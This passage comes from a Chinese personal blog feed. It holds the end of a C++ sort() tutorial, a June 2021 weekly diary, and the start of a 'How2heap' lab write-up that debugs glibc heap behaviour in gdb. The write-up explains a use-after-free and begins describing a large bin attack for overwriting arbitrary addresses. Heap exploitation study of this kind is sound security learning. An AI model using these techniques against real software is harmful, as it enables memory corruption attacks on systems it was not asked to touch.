class="headerlink" title="对数组排序"></a>对数组排序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> arr[] = &#123; <span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span> &#125;;<br>sort(arr, arr + <span class="hljs-number">9</span>);<br></code></pre></td></tr></table></figure><p>需要注意的是，这里传入的是迭代器，所以要传入头指针和末尾指针（最后一个待排元素的后一个位置）,数组的话，变量名就是起始地址。</p><h3 id="对-vector-排序"><a href="#对-vector-排序" class="headerlink" title="对 vector 排序"></a>对 vector 排序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; arr;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">9</span>;i &gt;<span class="hljs-number">0</span>;i--)&#123;<br>    arr.push_back(i);<br>&#125;<br>sort(arr.begin(),arr.end());<br></code></pre></td></tr></table></figure><p>这里直接传入 vector 的 begin 和 end 两个迭代器就对整个 vector 完成了排序。</p><h3 id="对对象排序"><a href="#对对象排序" class="headerlink" title="对对象排序"></a>对对象排序</h3><p>如果<strong>只使用两个参数的话</strong>，要对对象排序，那么<strong>只能依靠重载运算符</strong>来实现。而且必须<strong>重载的是 &lt; 关系运算符</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">int</span> value;<br>    Test() : value(<span class="hljs-number">0</span>) &#123;&#125;;<br>    Test(<span class="hljs-keyword">int</span> x) : value(x) &#123;&#125;;<br><br>    <span class="hljs-comment">// 重载运算符</span><br>    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span> &lt; (<span class="hljs-keyword">const</span> Test&amp; t) &#123;<br>        <span class="hljs-keyword">if</span> (value &lt; t.value)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br><span class="hljs-built_in">vector</span>&lt;Test&gt; arr;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">9</span>; i &gt; <span class="hljs-number">0</span>; i--) &#123;<br>    arr.push_back(Test(i));<br>&#125;<br>sort(arr.begin(), arr.end());<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i =<span class="hljs-number">0</span>;i&lt;arr.size();i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,arr[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样，就根据 Test 类中 value 的值来升序排对象的顺序了。</p><h3 id="三个参数排序"><a href="#三个参数排序" class="headerlink" title="三个参数排序"></a>三个参数排序</h3><p>先不写了</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ol><li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MzYzMDAwNw==%E2%88%A3=2247486587&idx=1&sn=7becbafba2658a4c6bf901ee65dd5277&chksm=ec6e7523db19fc358cdaac6686d4d4c5c36309b69352c33f71ece38b90fef50394a5c004cb84&mpshare=1&scene=1&srcid=">https://mp.weixin.qq.com/s?__biz=MzI5MzYzMDAwNw==∣=2247486587&amp;idx=1&amp;sn=7becbafba2658a4c6bf901ee65dd5277&amp;chksm=ec6e7523db19fc358cdaac6686d4d4c5c36309b69352c33f71ece38b90fef50394a5c004cb84&amp;mpshare=1&amp;scene=1&amp;srcid=</a></li><li>视频 | 手撕九大经典排序算法，看我就够了！ - 力扣（LeetCode）的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/52884590">https://zhuanlan.zhihu.com/p/52884590</a></li><li><a href="https://blog.csdn.net/qq_46018418/article/details/106341404">https://blog.csdn.net/qq_46018418/article/details/106341404</a></li><li><a href="https://www.cnblogs.com/scyq/p/13053177.html">https://www.cnblogs.com/scyq/p/13053177.html</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>PAT</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>生活周报-June-14-to-20</title>
    <link href="/2021/06/17/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-14-to-20_new/"/>
    <url>/2021/06/17/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-14-to-20_new/</url>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>神州十二号发射成功</li><li>翻译泰斗许渊冲逝世，享年 100 岁</li><li>中国人首次进入自己的国际空间站</li><li>回形针被爆员工和美国军方有利益往来。</li></ol><p>​</p><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>最近的大作业、实验好多，快要撑不住了。</li><li>最近的夏令营好多，好紧张。</li><li>端午节收到了小雷的粽子，第一次吃咸粽子！一个云腿的一个菌子的，好下饭！</li><li>前一阵子气温很高（接近 40 度），然后这个周下了一周的雨。</li><li>最近掉头发有点多了，从今天，6.17，周四起，11：45 上床，不管还有什么任务没有完成，上床睡觉！</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li><a href="https://www.cnblogs.com/aspirant/p/8902285.html">HashMap, HashTable，HashSet,TreeMap 的时间复杂度 注意数组链表 增删改查的时间复杂度都不相同(阿里)</a></li><li><a href="https://www.jianshu.com/p/7495fad83877">哈希表详解</a></li><li><a href="https://blog.csdn.net/hguisu/article/details/7880288">海量数据处理算法—Bit-Map</a></li><li><a href="http://www.ruanyifeng.com/blog/2015/06/poisson-distribution.html">泊松分布和指数分布</a></li><li><a href="http://www.ruanyifeng.com/blog/2018/09/hash-collision-and-birthday-attack.html">哈希碰撞与生日攻击</a></li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>《觉醒年代》<br>《我的青铜时代 x 罗翔》<br>《我的青铜时代 x 陈佩斯》</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><p>下面是许渊冲许老爷子的一些话，人生哲理，愿君谨记：</p><ol><li><strong>生命不是你活过了多少日子，而是你记住了多少日子。我不管活多久，认真享受每一天，做自己喜欢的事情就好。</strong></li><li><strong>不要与人争，找到自己的热爱。</strong></li></ol><hr><ol start="3"><li>最好的爱是两个人彼此做个伴，不要束缚，不要缠绕，不要占有，不要渴望从对方的身上挖掘到意义，而应该是我们两个人并排坐在一起，看看这个落寞的人间。</li><li>林徽因的<em>《别丢掉》</em></li></ol><p>别丢掉这一把过往的热情，<br>现在流水似的，<br>轻轻在幽冷的山泉底，<br>在黑夜，在松林，<br>叹息似的渺茫，<br>你仍要保存着那真！<br>一样是明月，一样是隔山灯火，<br>满天的星，<br>只有人不见，<br>梦似的挂起，<br>你向黑夜要回那一句话——你仍得相信山谷中留着那回音！</p><ol start="5"><li>人生很长，被人喜欢这件事，我不赶时间。</li></ol><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>生成对抗网络 GAN</li><li>深度卷积神经网络进行虚假人脸识别-分别采用 MTCNN 架构、ResNet50 进行迁移学习</li><li>用 kali 进行无线安全实验，注意内置网卡无法识别，必须使用外置的无线网卡。</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>许渊冲先生千古，他为世人留下了上百本译本。这是一位值得我一生去学习的先生、长者。<br>​</p><p>他天资聪颖，17 岁便入西南联大读书，文学造诣首屈一指。然而他却没有就此懈怠，反而一生笔耕不辍，为世人留下上百本传世佳品。<br>​</p><p>62 岁，老先生以“一年至少新译一本名著、出一本论文集、写一本散文集”的速度，酣畅创造。<br>​</p><p>86 岁，他被诊断患直肠癌，医生说，他最多只有 7 年时间。他反而照旧抓紧一切时间，翻译诗词和名著。试想，此般精神，几人能有？那是死亡的宣判啊，但许老爷子害怕了吗？抱怨了吗？放弃希望了吗？不，他没有，那团生命之火，还在尽情的燃烧着，只要希望不死，人就能拥有活下去的勇气。这难道不令人振奋吗，这难道不令人动容吗？把生命融入到自己的热爱里，即使是上天也会为之感动，许老活了下来，坚强的，用生命去创造。<br>​</p><p>90 岁高龄，他给自己制定的计划是“每天翻译 1000 字”，93 岁，他的工作目标是，翻译完莎士比亚全集，96 岁，他居然骑车出门赏月！不慎摔伤骨折，老先生依然云淡风轻，“要不是为了走这美的路，我就不会摔了，不过月光如水，还摔的挺美的”。<br>​</p><p>人生百年，先生活得精彩。<br>​</p><p>先生的人生态度，值得我一生学习：<br>​</p><p>生老病死，世事浮沉，无改天真与疯狂。<br>​</p><p>“越向前走，越有光明的前途，每一个小时，都要快快活活。”<br>​</p><p>许老爷子一路走好。<br>​</p>]]></content>
    
    
    <categories>
      
      <category>周报</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>How2heap系列</title>
    <link href="/2021/05/31/How2heap%E7%B3%BB%E5%88%97_new/"/>
    <url>/2021/05/31/How2heap%E7%B3%BB%E5%88%97_new/</url>
    
    <content type="html"><![CDATA[<p>tags: []<br>categories: []<br>cover: “”<br>​</p><hr><p>实验使用 wsl 进行，具体的 glibc 版本为 2.28，运行<code>/lib/x86_64-linux-gnu/libc.so.6</code>即可看到版本<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-1.png#clientId=u347f053a-7aac-4&from=paste&height=121&id=ubcbe185e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=241&originWidth=756&originalType=binary&size=264115&status=done&style=none&taskId=u396bde25-eab2-4a06-bb3b-c2811987e8d&width=378" alt="image.png"></p><a id="more"></a><h1 id="安装-pwngdb-pwndbg"><a href="#安装-pwngdb-pwndbg" class="headerlink" title="安装 pwngdb+pwndbg"></a>安装 pwngdb+pwndbg</h1><p>参考<a href="https://blog.csdn.net/weixin_43092232/article/details/105648769">https://blog.csdn.net/weixin_43092232/article/details/105648769</a><br>配置如下<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-2.png#clientId=u347f053a-7aac-4&from=paste&height=181&id=udbe3c4f1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=362&originWidth=534&originalType=binary&size=278719&status=done&style=none&taskId=u86b81336-450f-40db-a685-ef4ce0a2429&width=267" alt="image.png"></p><h1 id="how2heap-概述"><a href="#how2heap-概述" class="headerlink" title="how2heap 概述"></a>how2heap 概述</h1><p><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-3.png#clientId=u347f053a-7aac-4&from=paste&height=328&id=u094da593&margin=%5Bobject%20Object%5D&name=image.png&originHeight=656&originWidth=1195&originalType=binary&size=115449&status=done&style=none&taskId=ua9828c89-666f-4095-af6d-4a8310c5693&width=597.5" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-4.png#clientId=u347f053a-7aac-4&from=paste&height=357&id=ued1b9be3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=714&originWidth=1202&originalType=binary&size=131426&status=done&style=none&taskId=u62e23b01-92b3-4bf2-9bf4-b40d8099d96&width=601" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-5.png#clientId=u347f053a-7aac-4&from=paste&height=324&id=udf398312&margin=%5Bobject%20Object%5D&name=image.png&originHeight=648&originWidth=1206&originalType=binary&size=141433&status=done&style=none&taskId=ueb73bcb6-30ef-4add-ac3a-64f6fa81b36&width=603" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-6.png#clientId=u347f053a-7aac-4&from=paste&height=89&id=uca37f774&margin=%5Bobject%20Object%5D&name=image.png&originHeight=178&originWidth=1199&originalType=binary&size=41410&status=done&style=none&taskId=u510b02f8-c5d4-432b-a698-2fe503733f1&width=599.5" alt="image.png"></p><h1 id="切换-glibc-版本"><a href="#切换-glibc-版本" class="headerlink" title="切换 glibc 版本"></a>切换 glibc 版本</h1><p>不到万不得已，不用<code>apt-get install libc-bin=2.24-11+deb9u1 libc6=2.24-11+deb9u1</code></p><blockquote><p>这个版本是通过</p></blockquote><p>glibc 是动态链接库<br>所以可以指定程序的任意 glibc 版本哦，ubuntu 的 glibc-all-in-one 也可以直接用在 debian 上的！<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-7.png#clientId=u347f053a-7aac-4&from=paste&height=238&id=u630ec27f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=476&originWidth=1052&originalType=binary&size=450517&status=done&style=none&taskId=u55f4ef69-a967-440a-977e-c93ae10ee37&width=526" alt="image.png"><br>然后参考<br><a href="https://blog.csdn.net/qq_45595732/article/details/115385790">https://blog.csdn.net/qq_45595732/article/details/115385790</a><br><a href="https://www.yuque.com/kaleido76/pwn/fn4432">https://www.yuque.com/kaleido76/pwn/fn4432</a><br><a href="https://blog.csdn.net/juluwangriyue/article/details/108617283">https://blog.csdn.net/juluwangriyue/article/details/108617283</a><br>并运行类似<br><code>patchelf --set-interpreter /mnt/f/桌面/大三下/软件安全/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so overlapping1</code></p><p><code>patchelf --set-rpath /mnt/f/桌面/大三下/软件安全/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 overlapping1 </code><br>​</p><p>大功告成<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-8.png#clientId=u347f053a-7aac-4&from=paste&height=175&id=ud788b965&margin=%5Bobject%20Object%5D&name=image.png&originHeight=349&originWidth=1285&originalType=binary&size=367384&status=done&style=none&taskId=u5b431fbb-b35d-4966-ad37-114dee52ab6&width=642.5" alt="image.png"></p><h1 id="first-fit-2-28"><a href="#first-fit-2-28" class="headerlink" title="first_fit-2.28"></a>first_fit-2.28</h1><p>这里没有任何攻击，说的是 glibc 分配内存的方式是最先适应算法，空闲块按地址递增的顺序排列，只要求分配空间大小小于该空闲空间大小，就可以分配。实例中给了分配两个 chunk，大小分别为 512 和 256，大于 fastbin，然后写入数据并释放第一个 512chunk，释放的 chunk 在 unsorted bin 之中，之后再分配 500 字节。此时由于 glibc 机制，直接在 unsorted bin 中找到并将其分割，一部分给用户，另一部分保留，所以第三个 chunk 指针与之前第一个 chunk 的相同。<br>我们首先编译<code>gcc first_fit.c -o first -g</code><br>然后<code>gdb first</code>进行调试<br>首先，输入 start<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-9.png#clientId=u347f053a-7aac-4&from=paste&height=345&id=ud7ff854b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=651&originWidth=1122&originalType=binary&size=1125083&status=done&style=none&taskId=u865c97c4-9a62-4c88-9ec7-fb5a1836f15&width=595" alt="image.png"><br>然后查看堆内存<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-10.png#clientId=u347f053a-7aac-4&from=paste&height=56&id=ua939020c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=85&originWidth=393&originalType=binary&size=47039&status=done&style=none&taskId=u8d8fb7a1-4131-4495-a082-a96510f4dc6&width=259.5" alt="image.png"><br>可以看到还是没有的<br>然后 n 单步运行过 13 行，再次运行 heap，可以看到<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-11.png#clientId=u347f053a-7aac-4&from=paste&height=439&id=udab41a45&margin=%5Bobject%20Object%5D&name=image.png&originHeight=878&originWidth=1160&originalType=binary&size=1557884&status=done&style=none&taskId=u232dd3dc-7d9b-4606-9589-d112211794b&width=580" alt="image.png"><br>即第一个 a 的地址就是 0x8005250，然后我们继续分配 b<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-12.png#clientId=u347f053a-7aac-4&from=paste&height=222&id=uf4233992&margin=%5Bobject%20Object%5D&name=image.png&originHeight=443&originWidth=501&originalType=binary&size=323156&status=done&style=none&taskId=u60f56a96-0f5d-4938-80fd-aa9847763cb&width=250.5" alt="image.png"><br>可以发现 b 的地址是 0x8005770<br>而输出的数据是：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-13.png#clientId=u347f053a-7aac-4&from=paste&height=29&id=u0a63667d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=57&originWidth=321&originalType=binary&size=26195&status=done&style=none&taskId=u605230af-8d93-4b13-b34e-467e78437e4&width=160.5" alt="image.png"><br>这是因为我们知道 chunk 指针返回的是 mem 数据部分，chunk 在使用时的数据结构如下图：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp">    An allocated chunk looks like <span class="hljs-keyword">this</span>:<br>    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             Size of previous chunk, if unallocated (P clear)  |<br>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             Size of chunk, in bytes                     |A|M|P|<br>      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             User data starts here...                          .<br>    .                                                               .<br>    .             (malloc_usable_size() bytes)                      .<br>    .                                                               |<br>nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             (size of chunk, but used <span class="hljs-keyword">for</span> application data)    |<br>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             Size of next chunk, in bytes                |A|<span class="hljs-number">0</span>|<span class="hljs-number">1</span>|<br>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br><br></code></pre></td></tr></table></figure><p>其中 chunk 定义的结构体如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      mchunk_size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><p>每个字段的具体的解释如下</p><ul><li><strong>prev_size</strong>, 如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。**这里的前一 chunk 指的是较低地址的 chunk **。</li><li><strong>size</strong> ，该 chunk 的大小，大小必须是 2 _ SIZE_SZ 的整数倍。如果申请的内存大小不是 2 _ SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<ul><li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li><li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li><li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li><li><strong>fd，bk</strong>。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<ul><li>fd 指向下一个（非物理相邻）空闲的 chunk</li><li>bk 指向上一个（非物理相邻）空闲的 chunk</li><li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li></ul></li><li><strong>fd_nextsize， bk_nextsize</strong>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li></ul></li></ul><p>也就是说 malloc 返回的指针就是 chunk 的 fd 指针处，返回内存指针地址-0x10 是 chunk 块的真正头部。<br>这个时候我们可以查看以下两个 chunk 的结构：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-14.png#clientId=u347f053a-7aac-4&from=paste&height=39&id=u3578e819&margin=%5Bobject%20Object%5D&name=image.png&originHeight=78&originWidth=568&originalType=binary&size=60756&status=done&style=none&taskId=ud82be738-496f-4ff0-8b81-3c5a2fd229c&width=284" alt="image.png"><br>验证了我们的想法</p><blockquote><p>GDB 调试查看 Chunk 内存的时候，在 32 位系统的时候用 w（四字节 32 位），在 64 位系统的时候用 g（八字节 64 位）</p></blockquote><p>这时候我们往 a 的内存里面写入了”this is A!”的数据<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-15.png#clientId=u347f053a-7aac-4&from=paste&height=297&id=u2a9dd95c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=594&originWidth=951&originalType=binary&size=779596&status=done&style=none&taskId=u7c309d88-ed9c-4395-af94-51e0ef3120c&width=475.5" alt="image.png"><br>查看指针处数据<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-16.png#clientId=u347f053a-7aac-4&from=paste&height=40&id=uc43258b2&name=image.png&originHeight=80&originWidth=557&originalType=binary&size=61038&status=done&style=none&taskId=u36a0855c-611f-4636-8b65-a085361d73f&width=278.5" alt="image.png"><br>写入的数据就是上述字符串的 ASCII 码<br>当我们执行 free(a)释放 a 的内存块后，可以发现 a 先被放入了 unsortedbin 中，且 fd 指针和 bk 指针都指向了 main_arena<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-17.png#clientId=u347f053a-7aac-4&from=paste&height=471&id=uaab4248c&name=image.png&originHeight=941&originWidth=1113&originalType=binary&size=1596503&status=done&style=none&taskId=u46c0ff91-6ad9-4fbc-b7d0-fe90583f478&width=556.5" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-18.png#clientId=u347f053a-7aac-4&from=paste&height=225&id=u3f41a094&margin=%5Bobject%20Object%5D&name=image.png&originHeight=449&originWidth=864&originalType=binary&size=548857&status=done&style=none&taskId=u1a73c58c-a933-4d02-afde-ce7d7e95359&width=432" alt="image.png"><br>执行 c = malloc(0x500)，发现 c 分配到的内存块就是原来 a 分配到的内存块<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-19.png#clientId=u347f053a-7aac-4&from=paste&height=457&id=u07255dc9&name=image.png&originHeight=913&originWidth=954&originalType=binary&size=1290624&status=done&style=none&taskId=u8044fb4e-a813-4d6d-8367-2d0ae72e4ac&width=477" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-20.png#clientId=u347f053a-7aac-4&from=paste&height=27&id=u1ec3e24f&name=image.png&originHeight=53&originWidth=341&originalType=binary&size=30323&status=done&style=none&taskId=u1c7f382b-fb27-4d54-a074-30f5ab0390c&width=170.5" alt="image.png"><br>在 glibc-2.28 中，内存块全部分配，不在中 unsorted bin 保留<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-21.png#clientId=u347f053a-7aac-4&from=paste&height=229&id=uc4dc40e2&name=image.png&originHeight=458&originWidth=457&originalType=binary&size=297581&status=done&style=none&taskId=u10848018-20f0-4fd5-9087-0a157da04fb&width=228.5" alt="image.png"><br>然后在写入”This is C!”后查看内存情况<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-22.png#clientId=u347f053a-7aac-4&from=paste&height=322&id=uc4014290&margin=%5Bobject%20Object%5D&name=image.png&originHeight=644&originWidth=1129&originalType=binary&size=1108386&status=done&style=none&taskId=ucf59ceba-350e-4979-b446-a6239d8e756&width=564.5" alt="image.png"><br>可以发现和从之前的 0x41 变成了 0x43，说明从 A 变成了 C，然后继续执行<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-23.png#clientId=u347f053a-7aac-4&from=paste&height=30&id=u83f5467d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=59&originWidth=573&originalType=binary&size=52360&status=done&style=none&taskId=ue3b48849-bd89-4ac8-85de-3f0052f6e91&width=286.5" alt="image.png"><br>这说明这里其实存在一个漏洞：free 掉之后没有把指针置 0，造成一个 UAF(use after free)漏洞。就是 a 已经 free 掉之后又重新把那块地址分配回来再编辑会把 a 所指向的地址的内容也编辑了(也就是这个时候 a 跟 c 指向的是同一内存地址)。<br>修补：free 掉 a 之后，让 a 再指向 null。</p><h1 id="large-bin-attack-2-23"><a href="#large-bin-attack-2-23" class="headerlink" title="large_bin_attack-2.23"></a>large_bin_attack-2.23</h1><p>程序运行结果如下：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-24.png#clientId=u38185df4-f4d6-4&from=paste&height=409&id=u01dce496&margin=%5Bobject%20Object%5D&name=image.png&originHeight=817&originWidth=1905&originalType=binary&size=1486851&status=done&style=none&taskId=u795c39c6-fa0c-4eb5-bdbd-b2f34b0802f&width=952.5" alt="image.png"><br>该技术可用于修改任意地址的值，例如栈上的变量 stack_var1 和 stack_var2。在实践中常常作为其他漏洞利用的前奏，例如在 fastbin attack 中用于修改全局变量 global_max_fast 为一个很大的值。<br>首先我们分配 chunk p1, p2 和 p3，并且在它们之间插入其他的 chunk 以防止在释放时被合并。此时的内存布局如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">2</span>gx &amp;stack_var1<br><span class="hljs-number">0x7ffffffed9d0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000080079b0</span><br>pwndbg&gt; 